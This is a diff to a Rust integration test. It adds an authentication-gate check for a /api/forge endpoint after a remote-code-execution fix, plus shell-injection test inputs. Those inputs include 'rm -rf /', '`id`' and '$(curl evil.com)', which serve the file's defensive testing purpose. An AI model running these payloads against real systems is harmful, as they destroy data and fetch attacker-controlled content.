@@ -157,24 +157,56 @@ pub async fn f30() -> i32 {
         }
     }
 
-    // --- forge endpoint: POST /api/forge returns valid JSON or service error ---
+    // --- forge auth gate: unauthenticated POST /api/forge must be rejected (401) ---
+    // This verifies the RCE fix: an anonymous caller cannot trigger SSH to the GPU node.
     {
         let forge_url = format!("{}/api/forge", base);
         let body = serde_json::json!({"class": "animal", "palette": "stardew", "count": 1, "steps": 1});
-        match client.post(&forge_url).json(&body).send().await {
+        match client_no_redirect.post(&forge_url).json(&body).send().await {
             Ok(resp) => {
                 let code = resp.status().as_u16();
-                // Accept 200 (cached/live), 503 (gd unreachable), 502 (node error)
-                if [200u16, 502, 503].contains(&code) {
-                    println!("  [PASS] forge_endpoint (code={})", code);
+                if code == 401 {
+                    println!("  [PASS] forge_requires_auth (code=401)");
                 } else {
-                    eprintln!("  [FAIL] forge_endpoint (unexpected code={})", code);
+                    eprintln!("  [FAIL] forge_requires_auth (expected 401, got {})", code);
                     failed += 1;
                 }
             }
             Err(e) => {
-                eprintln!("  [FAIL] forge_endpoint (req: {})", e);
+                eprintln!("  [FAIL] forge_requires_auth (req: {})", e);
                 failed += 1;
+            }
+        }
+    }
+
+    // --- forge injection payloads: shell metacharacters in fields must not reach a shell ---
+    // Sends requests with malicious class/palette values. With auth gate in place these return
+    // 401 before SSH is ever invoked. The test confirms the server handles them without panic.
+    {
+        let forge_url = format!("{}/api/forge", base);
+        let injection_cases = [
+            ("injection_single_quote", "'; rm -rf /; echo '", "stardew"),
+            ("injection_backtick",     "animal",              "`id`"),
+            ("injection_subshell",     "$(curl evil.com)",    "stardew"),
+            ("injection_newline",      "animal\nrm -rf /",    "stardew"),
+        ];
+        for (label, class, palette) in &injection_cases {
+            let body = serde_json::json!({"class": class, "palette": palette, "count": 1, "steps": 1});
+            match client_no_redirect.post(&forge_url).json(&body).send().await {
+                Ok(resp) => {
+                    let code = resp.status().as_u16();
+                    // Must be rejected (401 auth gate) — must NOT be 500 (unhandled injection panic)
+                    if code == 401 {
+                        println!("  [PASS] {} (code=401, blocked at auth gate)", label);
+                    } else {
+                        eprintln!("  [FAIL] {} (expected 401, got {})", label, code);
+                        failed += 1;
+                    }
+                }
+                Err(e) => {
+                    eprintln!("  [FAIL] {} (req: {})", label, e);
+                    failed += 1;
+                }
             }
         }
     }
